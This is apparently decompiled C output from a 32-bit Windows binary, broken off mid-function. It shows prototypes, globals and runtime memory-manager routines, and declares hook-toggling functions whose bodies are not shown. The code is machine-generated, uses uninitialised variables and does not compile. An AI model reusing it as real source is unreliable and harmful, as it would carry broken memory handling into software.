int32_t function_408128(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_408174(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4081a4(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40823c(void);
int32_t function_408241(void);
int32_t function_408243(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_408253(void);
int32_t function_4082a0(void);
int32_t function_408310(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14);
int32_t function_408487(void);
int32_t function_40848c(void);
int32_t function_40848e(int32_t a1, int32_t a2);
int32_t function_408494(void);
int32_t function_4084ab(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40857f(void);
int32_t function_408584(void);
int32_t function_408586(int32_t a1, int32_t a2);
int32_t function_40858c(void);
int32_t function_408598(void);
int32_t function_4085b7(void);
int32_t function_4085bc(void);
int32_t function_4085be(int32_t a1);
int32_t function_4086c0(void);
int32_t function_408951(void);
int32_t function_408956(void);
int32_t JmpHookOff(void);
int32_t JmpHookOn(void);
int32_t unknown_4a02(void);
int32_t unknown_4fc0(void);
int32_t unknown_5098(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 37; // 0x404df4
int32_t g2 = 62; // 0x405dac
int32_t g3 = 46; // 0x405e10
int32_t g4 = 41; // 0x406930
int32_t g5 = 47; // 0x406c10
int32_t g6 = 47; // 0x407314
int32_t g7 = 0; // 0x409000
int32_t g8 = 0; // 0x409004
int32_t g9 = 0; // 0x409008
int32_t g10 = 0x408d02; // 0x40900c
int32_t g11 = 0; // 0x409010
int32_t g12 = 0; // 0x409014
char * g13 = "2\x13\x8b\xc0"; // 0x409018
char g14 = 0; // 0x40901c
char g15 = 0; // 0x409020
char g16 = 0; // 0x409024
int32_t g17 = 0; // 0x409028
int32_t g18 = 0; // 0x40902c
char * g19 = "0123456789ABCDEF\xff\xff\xff\xff"; // 0x409080
int32_t g20 = -1; // 0x409090
int32_t g21 = 0; // 0x409094
int32_t g22 = 0; // 0x409098
int32_t g23 = 0; // 0x40909c
int32_t g24 = 0; // 0x4090a0
char * g25 = "aixiaran\x10H@"; // 0x4090d0
int32_t g26 = 0x408d01; // 0x4090f0
int32_t g27 = 1; // 0x4090f8
int32_t g28 = 0; // 0x409104
int32_t g29 = 0; // 0x409108
int32_t g30 = 0; // 0x40910c
int32_t g31 = 0; // 0x409110
int32_t g32 = 0; // 0x409114
int32_t g33 = 0; // 0x409118
int32_t g34; // 0x40912c
int32_t g35; // 0x409138
int32_t g36; // 0x40913c
int32_t g37; // 0x409140
int32_t g38; // 0x409148
int32_t g39; // 0x409154
int32_t g41 = 0; // 0x40a000
int32_t g42 = 0; // 0x40a00c
int32_t g43 = 0; // 0x40a010
int32_t g44 = 0; // 0x40a014
int32_t g45 = 0; // 0x40a01c
int32_t g46 = 0; // 0x40a020
int32_t g47 = 0; // 0x40a024
int32_t g48 = 0; // 0x40a028
int32_t g49 = 0; // 0x40a02c
int32_t g50 = 0; // 0x40a030
char g51 = 0; // 0x40a034
char g52 = 0; // 0x40a035
int32_t g53 = 0; // 0x40a036
int32_t g54 = 0; // 0x40a038
int32_t g55 = 0; // 0x40a03c
int16_t g56 = 0; // 0x40a208
int32_t g57 = 0; // 0x40a3d4
int32_t g58 = 0; // 0x40a59c
int32_t g59 = 0; // 0x40a5a0
int32_t g60 = 0; // 0x40a5a4
int32_t g61 = 0; // 0x40a5a8
char g62 = 0; // 0x40a5ac
int32_t g63 = 0; // 0x40a5b0
struct _RTL_CRITICAL_SECTION * g64 = NULL; // 0x40a5b4
int32_t g65 = 0; // 0x40a5cc
int32_t g66 = 0; // 0x40a5d0
int32_t g67 = 0; // 0x40a5d4
int32_t g68 = 0; // 0x40a5e4
int32_t g69 = 0; // 0x40a5f4
int32_t g70 = 0; // 0x40a5f8
int32_t g71 = 0; // 0x40a600
int32_t g72 = 0; // 0x40a604
int32_t g73 = 0; // 0x40a608
int32_t g74 = 0; // 0x40a60c
int32_t g75 = 0; // 0x40a610
char * g76; // 0x40a620
int32_t g77 = 0; // 0x40a624
int32_t g78 = 0; // 0x40a628
int32_t g79 = 0; // 0x40a62c
int32_t g80 = 0; // 0x40a630
char g81 = 0; // 0x40a648
char g82 = 0; // 0x40a64c
int32_t (*g83)(int32_t, int32_t, int32_t) = NULL; // 0x40a650
int32_t g84 = 0; // 0x40a654
int32_t g85 = 0; // 0x40a658
int32_t g86 = 0; // 0x40a65c
int32_t g87 = 0; // 0x40a660
int32_t g88 = 0; // 0x40a664
int32_t g89 = 0; // 0x40a678
int32_t g90 = 0; // 0x40a67c
int32_t g91 = 0; // 0x40a680
int32_t g92 = 0; // 0x40a684
int32_t g93 = 0; // 0x40a688
int32_t g94 = 0; // 0x40a698
int32_t g95 = 0; // 0x40a69c
int32_t g96 = 0; // 0x40a6a0
int32_t g97 = 0; // 0x40a6a4
int32_t g98 = 0; // 0x40a6a8
int32_t g99 = 0; // 0x40a6b8
int32_t g100 = 0; // 0x40a6bc
int32_t g101 = 0; // 0x40a6c4
int32_t g102 = 0; // 0x40a6d8
int32_t g103 = 0; // 0x40a6f4
int32_t g104 = 0; // 0x40a6fc
int32_t g105 = 0; // 0x40a700
int32_t g106 = 0; // 0x40a710
int32_t g107 = 0; // 0x40a718
int32_t g108 = 0; // 0x40a724
char * g109; // 0x40a734
int32_t g110 = 0; // 0x40a844
int32_t g111;
int32_t * g40 = &g26; // 0x409160

// ------------------------ Functions -------------------------

// Address range: 0x401060 - 0x401066
int32_t * function_401060(int32_t nStdHandle) {
    // 0x401060
    return GetStdHandle(nStdHandle);
}

// Address range: 0x401068 - 0x40106e
void function_401068(int32_t dwExceptionCode, int32_t dwExceptionFlags, int32_t nNumberOfArguments, int32_t * lpArguments) {
    // 0x401068
    RaiseException(dwExceptionCode, dwExceptionFlags, nNumberOfArguments, lpArguments);
}

// Address range: 0x401070 - 0x401076
void function_401070(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue) {
    // 0x401070
    RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);
}

// Address range: 0x401078 - 0x40107e
int32_t function_401078(struct _EXCEPTION_POINTERS * ExceptionInfo) {
    // 0x401078
    return UnhandledExceptionFilter(ExceptionInfo);
}

// Address range: 0x401080 - 0x401086
bool function_401080(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToWrite, int32_t * lpNumberOfBytesWritten, struct _OVERLAPPED * lpOverlapped) {
    // 0x401080
    return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

// Address range: 0x401088 - 0x40108e
void function_401088(int32_t uExitCode) {
    // 0x401088
    ExitProcess(uExitCode);
}

// Address range: 0x401090 - 0x401096
int32_t function_401090(int32_t * hWnd, char * lpText, char * lpCaption, int32_t uType) {
    // 0x401090
    return MessageBoxA(hWnd, lpText, lpCaption, uType);
}

// Address range: 0x401098 - 0x40109e
bool function_401098(int32_t * hLibModule) {
    // 0x401098
    return FreeLibrary(hLibModule);
}

// Address range: 0x4010a0 - 0x4010a6
char * function_4010a0(void) {
    // 0x4010a0
    return GetCommandLineA();
}

// Address range: 0x4010a8 - 0x4010ae
int32_t function_4010a8(int32_t Locale, int32_t LCType, char * lpLCData, int32_t cchData) {
    // 0x4010a8
    return GetLocaleInfoA(Locale, LCType, lpLCData, cchData);
}

// Address range: 0x4010b0 - 0x4010b6
void function_4010b0(struct _STARTUPINFOA * lpStartupInfo) {
    // 0x4010b0
    GetStartupInfoA(lpStartupInfo);
}

// Address range: 0x4010b8 - 0x4010be
int32_t function_4010b8(void) {
    // 0x4010b8
    return GetThreadLocale();
}

// Address range: 0x4010c0 - 0x4010c6
int32_t function_4010c0(int32_t * hKey) {
    // 0x4010c0
    return RegCloseKey(hKey);
}

// Address range: 0x4010c8 - 0x4010ce
int32_t function_4010c8(int32_t * hKey, char * lpSubKey, int32_t ulOptions, int32_t samDesired, int32_t ** phkResult) {
    // 0x4010c8
    return RegOpenKeyExA(hKey, lpSubKey, ulOptions, samDesired, phkResult);
}

// Address range: 0x4010d0 - 0x4010d6
int32_t function_4010d0(int32_t * hKey, char * lpValueName, int32_t * lpReserved, int32_t * lpType, char * lpData, int32_t * lpcbData) {
    // 0x4010d0
    return RegQueryValueExA(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData);
}

// Address range: 0x4010d8 - 0x4010de
int32_t function_4010d8(int16_t ** pbstr, int16_t * psz, int32_t len) {
    // 0x4010d8
    return SysReAllocStringLen(pbstr, psz, len);
}

// Address range: 0x4010e0 - 0x4010e6
void function_4010e0(int16_t * bstrString) {
    // 0x4010e0
    SysFreeString(bstrString);
}

// Address range: 0x4010e8 - 0x4010ee
int32_t function_4010e8(void) {
    // 0x4010e8
    return GetCurrentThreadId();
}

// Address range: 0x4010f0 - 0x4010f6
int32_t function_4010f0(void) {
    // 0x4010f0
    return GetVersion();
}

// Address range: 0x4010f8 - 0x4010fe
bool function_4010f8(struct _LARGE_INTEGER * lpPerformanceCount) {
    // 0x4010f8
    return QueryPerformanceCounter(lpPerformanceCount);
}

// Address range: 0x401100 - 0x401106
int32_t function_401100(void) {
    // 0x401100
    return GetTickCount();
}

// Address range: 0x401108 - 0x40112a
int32_t function_401108(void) {
    // 0x401108
    int32_t lpStartupInfo; // 0x401108
    GetStartupInfoA((struct _STARTUPINFOA *)lpStartupInfo);
    uint16_t v1; // 0x401108
    char v2; // 0x401108
    return (v2 & 1) == 0 ? 10 : (int32_t)v1;
}

// Address range: 0x40112c - 0x401132
int32_t * function_40112c(int32_t uFlags, int32_t uBytes) {
    // 0x40112c
    return LocalAlloc(uFlags, uBytes);
}

// Address range: 0x401134 - 0x40113a
int32_t * function_401134(int32_t * hMem) {
    // 0x401134
    return LocalFree(hMem);
}

// Address range: 0x40113c - 0x401142
int32_t * function_40113c(int32_t * lpAddress, int32_t dwSize, int32_t flAllocationType, int32_t flProtect) {
    // 0x40113c
    return VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
}

// Address range: 0x401144 - 0x40114a
bool function_401144(int32_t * lpAddress, int32_t dwSize, int32_t dwFreeType) {
    // 0x401144
    return VirtualFree(lpAddress, dwSize, dwFreeType);
}

// Address range: 0x40114c - 0x401152
void function_40114c(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x40114c
    InitializeCriticalSection(lpCriticalSection);
}

// Address range: 0x401154 - 0x40115a
void function_401154(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x401154
    EnterCriticalSection(lpCriticalSection);
}

// Address range: 0x40115c - 0x401162
void function_40115c(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x40115c
    LeaveCriticalSection(lpCriticalSection);
}

// Address range: 0x401164 - 0x40116a
void function_401164(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x401164
    DeleteCriticalSection(lpCriticalSection);
}

// Address range: 0x40116c - 0x4011bb
int32_t function_40116c(int32_t a1, int32_t a2) {
    int32_t result = g66; // 0x401173
    if (result != 0) {
        // 0x4011b2
        g66 = *(int32_t *)result;
        return result;
    }
    // 0x401178
    int32_t uBytes; // 0x40116c
    int32_t uFlags; // 0x40116c
    int32_t * memoryHandle = LocalAlloc(uFlags, uBytes); // 0x40117f
    if (memoryHandle == NULL) {
        // 0x40118a
        return 0;
    }
    int32_t v1 = (int32_t)memoryHandle; // 0x40117f
    *memoryHandle = g65;
    g65 = v1;
    int32_t v2 = 0; // 0x40119c
    int32_t result2 = v1 + 4 + 16 * v2; // 0x4011a2
    int32_t * v3 = (int32_t *)result2;
    *v3 = g66;
    g66 = result2;
    v2++;
    while (v2 != 100) {
        int32_t v4 = result2; // 0x4011a6
        result2 = v1 + 4 + 16 * v2;
        v3 = (int32_t *)result2;
        *v3 = v4;
        g66 = result2;
        v2++;
    }
    // 0x4011b2
    g66 = *v3;
    return result2;
}

// Address range: 0x4011bc - 0x4011c2
int32_t function_4011bc(void) {
    // 0x4011bc
    int32_t result; // 0x4011bc
    return result;
}

// Address range: 0x4011c4 - 0x4011f4
int32_t function_4011c4(void) {
    // 0x4011c4
    int32_t v1; // 0x4011c4
    int32_t v2; // 0x4011c4
    int32_t v3 = function_40116c(v2, v1); // 0x4011ca
    if (v3 == 0) {
        // 0x4011d3
        return 0;
    }
    // 0x4011d8
    int32_t v4; // 0x4011c4
    *(int32_t *)(v3 + 12) = *(int32_t *)(v4 + 4);
    *(int32_t *)v3 = v3;
    *(int32_t *)(v3 + 4) = v3;
    int32_t v5; // 0x4011c4
    *(int32_t *)v5 = v3;
    return v3 & -256 | 1;
}

// Address range: 0x4011f4 - 0x40120c
int32_t function_4011f4(void) {
    // 0x4011f4
    int32_t result; // 0x4011f4
    int32_t * v1 = (int32_t *)(result + 4); // 0x4011f4
    *(int32_t *)result = g66;
    return result;
}

// Address range: 0x40120c - 0x40127c
int32_t function_40120c(void) {
    // 0x40120c
    int32_t v1; // 0x40120c
    int32_t * v2 = (int32_t *)v1; // 0x401220
    int32_t v3; // 0x40120c
    int32_t v4 = *(int32_t *)(v3 + 4); // 0x401222
    int32_t * v5 = (int32_t *)(v1 + 4); // 0x401225
    *v5 = v4;
    int32_t v6; // 0x40120c
    int32_t v7 = *(int32_t *)v6; // 0x401228
    int32_t * v8 = (int32_t *)(v6 + 8); // 0x40122c
    int32_t v9 = *v8; // 0x40122c
    int32_t * v10 = (int32_t *)(v6 + 12); // 0x40122f
    int32_t v11; // 0x40120c
    int32_t v12; // 0x401245
    int32_t v13; // 0x40125c
    if (v1 != *v10 + v9) {
        // 0x40124a
        v11 = v4;
        if (v4 + v1 == v9) {
            // 0x401252
            function_4011f4();
            v13 = *v5 + *v10;
            *v5 = v13;
            v11 = v13;
        }
    } else {
        // 0x401236
        function_4011f4();
        *v2 = *v8;
        v12 = *v5 + *v10;
        *v5 = v12;
        v11 = v12;
    }
    int32_t v14 = v11; // 0x401263
    v6 = v7;
    int32_t v15; // 0x40120c
    while (v15 != v7) {
        // 0x401228
        v7 = *(int32_t *)v6;
        v8 = (int32_t *)(v6 + 8);
        v9 = *v8;
        v10 = (int32_t *)(v6 + 12);
        if (v1 != *v10 + v9) {
            // 0x40124a
            v11 = v14;
            if (v14 + v1 == v9) {
                // 0x401252
                function_4011f4();
                v13 = *v5 + *v10;
                *v5 = v13;
                v11 = v13;
            }
        } else {
            // 0x401236
            function_4011f4();
            *v2 = *v8;
            v12 = *v5 + *v10;
            *v5 = v12;
            v11 = v12;
        }
        // 0x40125f
        v14 = v11;
        v6 = v7;
    }
    int32_t v16 = function_4011c4(); // 0x401269
    int32_t result = v16; // 0x401270
    if ((char)v16 == 0) {
        // 0x401272
        *v2 = 0;
        result = 0;
    }
    // 0x401276
    return result;
}

// Address range: 0x40127c - 0x40130f
int32_t function_40127c(void) {
    // 0x40127c
    uint32_t v1; // 0x40127c
    int32_t * v2 = (int32_t *)(v1 + 4);
    int32_t v3; // 0x40127c
    int32_t * v4 = (int32_t *)(v3 + 8);
    uint32_t v5 = *v4; // 0x401289
    int32_t result; // 0x40127c
    int32_t v6; // 0x401297
    uint32_t v7; // 0x401297
    int32_t v8; // 0x4012a8
    int32_t v9; // 0x4012ab
    int32_t v10; // 0x4012ef
    int32_t v11; // 0x401292
    uint32_t v12; // 0x401292
    int32_t * v13; // 0x40127c
    if (v1 >= v5) {
        // 0x401290
        v11 = *v2;
        v12 = v11 + v1;
        v13 = (int32_t *)(v3 + 12);
        v6 = *v13;
        v7 = v6 + v5;
        if (v12 <= v7) {
            if (v1 != v5) {
                if (v12 != v7) {
                    // 0x4012d2
                    *v13 = v1 - v5;
                    v10 = function_4011c4();
                    result = 0;
                    if ((char)v10 != 0) {
                        // 0x4012fc
                        result = v10 & -256 | 1;
                        return result;
                    } else {
                        return result;
                    }
                } else {
                    // 0x4012cd
                    *v13 = v6 - v11;
                    // 0x4012fc
                    result = v5 & -256 | 1;
                    return result;
                }
            } else {
                // 0x4012a2
                *v4 = v11 + v5;
                v8 = *v2;
                v9 = *v13 - v8;
                *v13 = v9;
                if (v9 != 0) {
                    // 0x4012fc
                    result = v8 & -256 | 1;
                    return result;
                } else {
                    // 0x4012fc
                    result = function_4011f4() & -256 | 1;
                    return result;
                }
            }
        }
    }
    int32_t v14 = *(int32_t *)v3; // 0x401300
    result = 0;
    int32_t v15; // 0x40127c
    while (v15 != v14) {
        int32_t v16 = v14;
        v4 = (int32_t *)(v16 + 8);
        v5 = *v4;
        if (v1 >= v5) {
            // 0x401290
            v11 = *v2;
            v12 = v11 + v1;
            v13 = (int32_t *)(v16 + 12);
            v6 = *v13;
            v7 = v6 + v5;
            if (v12 <= v7) {
                if (v1 != v5) {
                    if (v12 != v7) {
                        // 0x4012d2
                        *v13 = v1 - v5;
                        v10 = function_4011c4();
                        result = 0;
                        if ((char)v10 != 0) {
                            // 0x4012fc
                            result = v10 & -256 | 1;
                            return result;
                        } else {
                            return result;
                        }
                    } else {
                        // 0x4012cd
                        *v13 = v6 - v11;
                        // 0x4012fc
                        result = v5 & -256 | 1;
                        return result;
                    }
                } else {
                    // 0x4012a2
                    *v4 = v11 + v5;
                    v8 = *v2;
                    v9 = *v13 - v8;
                    *v13 = v9;
                    if (v9 != 0) {
                        // 0x4012fc
                        result = v8 & -256 | 1;
                        return result;
                    } else {
                        // 0x4012fc
                        result = function_4011f4() & -256 | 1;
                        return result;
                    }
                }
            }
        }
        // 0x401300
        v14 = *(int32_t *)v16;
        result = 0;
    }
  lab_0x401308:
    // 0x401308
    return result;
}

// Address range: 0x401310 - 0x401373
int32_t function_401310(void) {
    // 0x401310
    int32_t dwFreeType; // 0x401310
    int32_t v1; // 0x401310
    *(int32_t *)(dwFreeType + 4) = v1 > 0xfffff ? v1 + 0xffff & -0x10000 : 0x100000;
    int32_t flAllocationType; // 0x401310
    int32_t dwSize; // 0x401310
    int32_t lpAddress; // 0x401310
    int32_t * memory = VirtualAlloc((int32_t *)lpAddress, dwSize, flAllocationType, 1); // 0x40133f
    int32_t result = (int32_t)memory; // 0x40133f
    int32_t * v2 = (int32_t *)dwFreeType; // 0x401346
    *v2 = result;
    if (memory == NULL) {
        // 0x40136f
        return result;
    }
    int32_t v3 = function_4011c4(); // 0x401353
    int32_t result2 = v3; // 0x40135a
    if ((char)v3 == 0) {
        // 0x40135c
        VirtualFree((int32_t *)0x8000, 0, dwFreeType);
        *v2 = 0;
        result2 = 0;
    }
    // 0x40136f
    return result2;
}

// Address range: 0x401374 - 0x4013eb
int32_t function_401374(void) {
    // 0x401374
    int32_t v1; // 0x401374
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x40137e
    *v2 = 0x100000;
    int32_t flAllocationType; // 0x401374
    int32_t dwSize; // 0x401374
    int32_t flProtect; // 0x401374
    int32_t lpAddress; // 0x401374
    int32_t * memory = VirtualAlloc((int32_t *)lpAddress, dwSize, flAllocationType, flProtect); // 0x401392
    int32_t v3 = (int32_t)memory; // 0x401392
    int32_t * v4 = (int32_t *)v1; // 0x401399
    *v4 = v3;
    int32_t memory2 = v3; // 0x40139d
    int32_t v5; // bp-32, 0x401374
    int32_t * v6 = &v5; // 0x40139d
    if (memory == NULL) {
        // 0x40139f
        int32_t v7; // 0x401374
        int32_t flAllocationType2 = v7 + 0xffff & -0x10000; // 0x4013a5
        *v2 = flAllocationType2;
        int32_t flProtect2; // 0x401374
        memory2 = (int32_t)VirtualAlloc((int32_t *)4, 0x2000, flAllocationType2, flProtect2);
        *v4 = memory2;
        int32_t v8; // bp-48, 0x401374
        v6 = &v8;
    }
    // 0x4013be
    if (v1 == 0) {
        // 0x4013e6
        return memory2;
    }
    int32_t v9 = function_4011c4(); // 0x4013ca
    int32_t result = v9; // 0x4013d1
    if ((char)v9 == 0) {
        int32_t v10 = (int32_t)v6;
        *(int32_t *)(v10 - 4) = 0x8000;
        *(int32_t *)(v10 - 8) = 0;
        VirtualFree(&g111, (int32_t)&g111, (int32_t)&g111);
        *v4 = 0;
        result = 0;
    }
    // 0x4013e6
    return result;
}

// Address range: 0x4013ec - 0x4014a4
int32_t function_4013ec(void) {
    // 0x4013ec
    int32_t v1; // bp-36, 0x4013ec
    int32_t v2 = &v1; // 0x4013f0
    int32_t v3 = v2; // 0x401472
    if (g67 != (int32_t)&g67) {
        int32_t v4 = *(int32_t *)g67; // 0x40141b
        uint32_t v5 = *(int32_t *)(g67 + 8); // 0x40141d
        int32_t v6 = v2; // 0x401422
        int32_t v7; // 0x4013ec
        uint32_t v8; // 0x4013ec
        uint32_t v9; // 0x4013ec
        int32_t * v10; // 0x401426
        int32_t v11; // 0x4013ec
        int32_t * v12; // 0x40142f
        int32_t * v13; // 0x40143e
        int32_t v14; // 0x40144f
        if (v9 <= v5) {
            // 0x401424
            v10 = (int32_t *)(g67 + 12);
            v11 = *v10 + v5;
            v6 = v2;
            if (v11 <= *(int32_t *)(v2 + 16)) {
                // 0x40142f
                v12 = (int32_t *)(v2 + 8);
                v7 = v11;
                if (v5 < *v12) {
                    // 0x401435
                    *v12 = v5;
                    v7 = *v10 + v5;
                }
                // 0x401439
                v8 = v7;
                v13 = (int32_t *)(v2 + 12);
                if (v8 > *v13) {
                    // 0x401444
                    *v13 = v8;
                }
                // 0x401448
                *(int32_t *)(v2 - 4) = 0x8000;
                *(int32_t *)(v2 - 8) = 0;
                v14 = v2 - 12;
                *(int32_t *)v14 = v5;
                if (!VirtualFree(&g111, (int32_t)&g111, (int32_t)&g111)) {
                    // 0x401459
                    g63 = 1;
                }
                // 0x401463
                function_4011f4();
                v6 = v14;
            }
        }
        int32_t v15 = v6;
        v3 = v15;
        while (v4 != (int32_t)&g67) {
            int32_t v16 = v15;
            int32_t v17 = v4;
            v4 = *(int32_t *)v17;
            v5 = *(int32_t *)(v17 + 8);
            v6 = v16;
            if (v9 <= v5) {
                // 0x401424
                v10 = (int32_t *)(v17 + 12);
                v11 = *v10 + v5;
                v6 = v16;
                if (v11 <= *(int32_t *)(v16 + 16)) {
                    // 0x40142f
                    v12 = (int32_t *)(v16 + 8);
                    v7 = v11;
                    if (v5 < *v12) {
                        // 0x401435
                        *v12 = v5;
                        v7 = *v10 + v5;
                    }
                    // 0x401439
                    v8 = v7;
                    v13 = (int32_t *)(v16 + 12);
                    if (v8 > *v13) {
                        // 0x401444
                        *v13 = v8;
                    }
                    // 0x401448
                    *(int32_t *)(v16 - 4) = 0x8000;
                    *(int32_t *)(v16 - 8) = 0;
                    v14 = v16 - 12;
                    *(int32_t *)v14 = v5;
                    if (!VirtualFree(&g111, (int32_t)&g111, (int32_t)&g111)) {
                        // 0x401459
                        g63 = 1;
                    }
                    // 0x401463
                    function_4011f4();
                    v6 = v14;
                }
            }
            // 0x40146a
            v15 = v6;
            v3 = v15;
        }
    }
    int32_t * v18 = (int32_t *)(v3 + 4); // 0x401474
    int32_t v19 = *v18; // 0x401474
    *(int32_t *)v19 = 0;
    int32_t * v20 = (int32_t *)(v3 + 12); // 0x40147c
    int32_t result = v19; // 0x401481
    if (*v20 != 0) {
        int32_t * v21 = (int32_t *)(v3 + 8); // 0x401487
        *(int32_t *)*v18 = *v21;
        result = *v20 - *v21;
        *(int32_t *)(*v18 + 4) = result;
    }
    // 0x40149c
    return result;
}

// Address range: 0x4014a4 - 0x401536
int32_t function_4014a4(void) {
    // 0x4014a4
    int32_t v1; // 0x4014a4
    uint32_t v2 = v1 & -0x1000; // 0x4014b6
    int32_t v3; // 0x4014a4
    *(int32_t *)v3 = v2;
    int32_t v4; // 0x4014a4
    int32_t result = (v4 + 4095 + v1 & -0x1000) - v2; // 0x4014d9
    *(int32_t *)(v3 + 4) = result;
    if (g67 == (int32_t)&g67) {
        // 0x40152e
        return result;
    }
    int32_t v5 = g67;
    int32_t v6; // bp-28, 0x4014a4
    int32_t v7 = &v6;
    uint32_t v8 = *(int32_t *)(v5 + 8); // 0x4014ea
    uint32_t v9 = *(int32_t *)(v5 + 12) + v8; // 0x4014f0
    uint32_t v10 = v2 > v8 ? v2 : v8;
    uint32_t v11 = *(int32_t *)(v7 + 8); // 0x4014f8
    uint32_t v12 = v9 > v11 ? v11 : v9;
    int32_t v13 = result; // 0x401504
    int32_t v14 = v7; // 0x401504
    int32_t * memory; // 0x401511
    if (v12 > v10) {
        // 0x401506
        *(int32_t *)(v7 - 4) = 4;
        *(int32_t *)(v7 - 8) = 0x1000;
        *(int32_t *)(v7 - 12) = v12 - v10;
        v14 = v7 - 16;
        *(int32_t *)v14 = v10;
        memory = VirtualAlloc(&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111);
        v13 = (int32_t)memory;
        if (memory == NULL) {
            // break -> 0x40151a
            break;
        }
    }
    int32_t v15 = v13;
    v5 = *(int32_t *)v5;
    int32_t result2 = v15; // 0x40152c
    while (v5 != (int32_t)&g67) {
        // 0x4014ea
        v7 = v14;
        v8 = *(int32_t *)(v5 + 8);
        v9 = *(int32_t *)(v5 + 12) + v8;
        v10 = v2 > v8 ? v2 : v8;
        v11 = *(int32_t *)(v7 + 8);
        v12 = v9 > v11 ? v11 : v9;
        v13 = v15;
        v14 = v7;
        if (v12 > v10) {
            // 0x401506
            *(int32_t *)(v7 - 4) = 4;
            *(int32_t *)(v7 - 8) = 0x1000;
            *(int32_t *)(v7 - 12) = v12 - v10;
            v14 = v7 - 16;
            *(int32_t *)v14 = v10;
            memory = VirtualAlloc(&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111);
            v13 = (int32_t)memory;
            if (memory == NULL) {
                // break -> 0x40151a
                break;
            }
        }
        // 0x401524
        v15 = v13;
        v5 = *(int32_t *)v5;
        result2 = v15;
    }
    // 0x40152e
    return result2;
}

// Address range: 0x401538 - 0x4015b5
int32_t function_401538(int32_t a1, int32_t a2, int32_t a3) {
    // 0x401538
    int32_t v1; // 0x401538
    int32_t v2 = v1 + 4095 & -0x1000; // 0x401547
    int32_t v3 = v2; // bp-20, 0x40154d
    int32_t v4; // 0x401538
    uint32_t v5 = v1 + v4 & -0x1000; // 0x401554
    int32_t v6; // 0x401538
    *(int32_t *)v6 = v2;
    int32_t result = v5 - v3; // 0x401561
    *(int32_t *)(v6 + 4) = result;
    if (g67 == (int32_t)&g67) {
        // 0x4015af
        return result;
    }
    int32_t v7 = g67;
    int32_t v8 = &v3;
    uint32_t v9 = *(int32_t *)(v7 + 8); // 0x40156f
    uint32_t v10 = *(int32_t *)(v7 + 12) + v9; // 0x401575
    uint32_t v11 = *(int32_t *)v8; // 0x401577
    uint32_t v12 = v9 >= v11 ? v9 : v11;
    uint32_t v13 = v5 >= v10 ? v10 : v5;
    int32_t v14 = result; // 0x401587
    int32_t v15 = v8; // 0x401587
    int32_t v16; // 0x401591
    bool v17; // 0x401592
    int32_t v18; // 0x401592
    if (v13 > v12) {
        // 0x401589
        *(int32_t *)(v8 - 4) = 0x4000;
        *(int32_t *)(v8 - 8) = v13 - v12;
        v16 = v8 - 12;
        *(int32_t *)v16 = v12;
        v17 = VirtualFree(&g111, (int32_t)&g111, (int32_t)&g111);
        v18 = v17;
        v14 = v18;
        v15 = v16;
        if (!v17) {
            // 0x40159b
            g63 = 2;
            v14 = v18;
            v15 = v16;
        }
    }
    int32_t result2 = v14;
    v7 = *(int32_t *)v7;
    while (v7 != (int32_t)&g67) {
        // 0x40156f
        v8 = v15;
        v9 = *(int32_t *)(v7 + 8);
        v10 = *(int32_t *)(v7 + 12) + v9;
        v11 = *(int32_t *)v8;
        v12 = v9 >= v11 ? v9 : v11;
        v13 = v5 >= v10 ? v10 : v5;
        v14 = result2;
        v15 = v8;
        if (v13 > v12) {
            // 0x401589
            *(int32_t *)(v8 - 4) = 0x4000;
            *(int32_t *)(v8 - 8) = v13 - v12;
            v16 = v8 - 12;
            *(int32_t *)v16 = v12;
            v17 = VirtualFree(&g111, (int32_t)&g111, (int32_t)&g111);
            v18 = v17;
            v14 = v18;
            v15 = v16;
            if (!v17) {
                // 0x40159b
                g63 = 2;
                v14 = v18;
                v15 = v16;
            }
        }
        // 0x4015a5
        result2 = v14;
        v7 = *(int32_t *)v7;
    }
    // 0x4015af
    return result2;
}

// Address range: 0x4015b8 - 0x401646
int32_t function_4015b8(int32_t a1) {
    // 0x4015b8
    int32_t v1; // 0x4015b8
    uint32_t v2 = v1 + 0x3fff & -0x4000; // 0x4015ce
    int32_t v3; // 0x4015b8
    int32_t v4; // 0x4015b8
    int32_t * v5; // 0x4015b8
    if (g68 != (int32_t)&g68) {
        v4 = g68;
        v5 = (int32_t *)(v4 + 12);
        if (v2 <= *v5) {
            // break (via goto) -> 0x4015de
            goto lab_0x4015de;
        }
        // 0x40160a
        v3 = *(int32_t *)v4;
        while (v3 != (int32_t)&g68) {
            // 0x4015d9
            v4 = v3;
            v5 = (int32_t *)(v4 + 12);
            if (v2 <= *v5) {
                // break (via goto) -> 0x4015de
                goto lab_0x4015de;
            }
            // 0x40160a
            v3 = *(int32_t *)v4;
        }
    }
    int32_t result = function_401310(); // 0x40161c
    int32_t v6; // 0x4015b8
    while (v6 != 0) {
        // 0x40161e
        function_40120c();
        int32_t v7; // 0x4015b8
        if (v7 == 0) {
            // 0x40162f
            function_4013ec();
            *(int32_t *)v6 = 0;
            result = 0;
            return result;
        }
        if (g68 != (int32_t)&g68) {
            v4 = g68;
            v5 = (int32_t *)(v4 + 12);
            if (v2 <= *v5) {
                // break (via goto) -> 0x4015de
                goto lab_0x4015de;
            }
            // 0x40160a
